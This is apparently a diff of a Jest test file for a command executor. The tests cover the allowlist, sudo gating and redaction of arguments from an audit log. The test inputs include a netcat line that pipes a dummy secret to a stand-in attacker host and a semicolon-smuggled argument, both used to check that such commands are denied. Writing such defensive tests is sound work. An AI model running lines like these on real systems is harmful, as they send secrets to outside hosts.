@@ -82,11 +82,11 @@ describe('commandExecutor.executeCommand', () => {
   it('accepts the { command, args } contract and passes args verbatim', async () => {
     succeedWith('[]');
 
-    await executeCommand({ command: 'docker', args: ['ps', '--format', '{{json .}}', 'a;b'] });
+    await executeCommand({ command: 'docker', args: ['ps', '--format', '{{json .}} a;b'] });
 
     expect(execFileMock).toHaveBeenCalledWith(
       path.join(binDir, 'docker'),
-      ['ps', '--format', '{{json .}}', 'a;b'],
+      ['ps', '--format', '{{json .}} a;b'],
       expect.objectContaining({ shell: false }),
       expect.any(Function)
     );
@@ -163,8 +163,9 @@ describe('commandExecutor.executeCommand', () => {
     expect(execFileMock).not.toHaveBeenCalled();
   });
 
-  it('runs sudo as "sudo -n <absolute path>" and honours ALLOW_SUDO_COMMANDS', async () => {
+  it('runs sudo as "sudo -n <absolute path>" only with ALLOW_SUDO_COMMANDS=true', async () => {
     succeedWith();
+    process.env.ALLOW_SUDO_COMMANDS = 'true';
     await executeCommand({ command: 'sudo', args: ['-n', 'systemctl', 'restart', 'nginx'] });
     expect(execFileMock).toHaveBeenCalledWith(
       path.join(binDir, 'sudo'),
@@ -174,9 +175,33 @@ describe('commandExecutor.executeCommand', () => {
     );
 
     execFileMock.mockClear();
-    process.env.ALLOW_SUDO_COMMANDS = 'false';
+    delete process.env.ALLOW_SUDO_COMMANDS;
     await expect(executeCommand('sudo systemctl restart nginx')).rejects.toMatchObject({ statusCode: 403 });
     expect(execFileMock).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    ['a denied program', 'mysql -u root -phunter2', 'mysql', 3],
+    ['a denied argument', 'docker run -e TOKEN=hunter2 alpine', 'docker', 4],
+    ['metacharacters', 'echo hunter2 | nc evil.example 4444', 'echo', 5],
+    ['an env assignment as the program', 'TOKEN=hunter2 ls', '<unparsed>', 1],
+  ])('never reports arguments to the audit sink for %s', async (_label, command, executable, argCount) => {
+    const audit = jest.fn();
+    setCommandAuditSink(audit);
+
+    await expect(executeCommand(command, { source: 'test' })).rejects.toMatchObject({ statusCode: 403 });
+
+    expect(audit).toHaveBeenCalledWith(expect.objectContaining({ executable, argCount, source: 'test' }));
+    expect(JSON.stringify(audit.mock.calls)).not.toContain('hunter2');
+  });
+
+  it('never reports argv-form arguments to the audit sink', async () => {
+    const audit = jest.fn();
+    setCommandAuditSink(audit);
+
+    await expect(executeCommand({ command: 'date', args: ['-f', '/etc/hunter2'] })).rejects.toMatchObject({ statusCode: 403 });
+
+    expect(JSON.stringify(audit.mock.calls)).not.toContain('hunter2');
   });
 
   it('denies everything when COMMAND_ALLOWLIST is empty', async () => {
